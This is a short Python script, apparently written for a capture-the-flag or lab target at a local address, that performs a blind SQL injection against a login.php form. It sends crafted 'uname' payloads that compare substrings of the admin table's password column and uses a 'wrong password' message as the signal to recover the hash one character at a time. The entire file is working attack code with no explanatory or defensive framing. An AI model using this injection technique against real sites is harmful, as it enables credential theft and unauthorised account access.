# _*_ coding:utf-8 _*_

from urllib.request import Request, urlopen
from urllib.parse import urlencode
words = "1234567890qwertyuiopasdfghjklzxcvbnm"
md5_str = '1234567890abcdef'
flag = ''
url = "http://127.0.0.1:10012/login.php"

for length in range(0,33):
	for i in words:
		payload = "1'=(select(1)from(admin)where(mid((passwd)from({}))='{}'))='".format(32-length,i+flag)
		#payload = "1'=(select(1)from(admin)where(mid((passwd)from({}))='{}'))='".format(32-length,i+flag)
		# print(payload)
		params = {'uname':payload ,'passwd' :'123'}
		data = urlencode(params).encode()
		req = Request(url,data=data)
		res = urlopen(req)
		c = res.read().decode('utf-8')

		if "密码错误" in c:
			flag = i + flag
			print(32-length,flag)
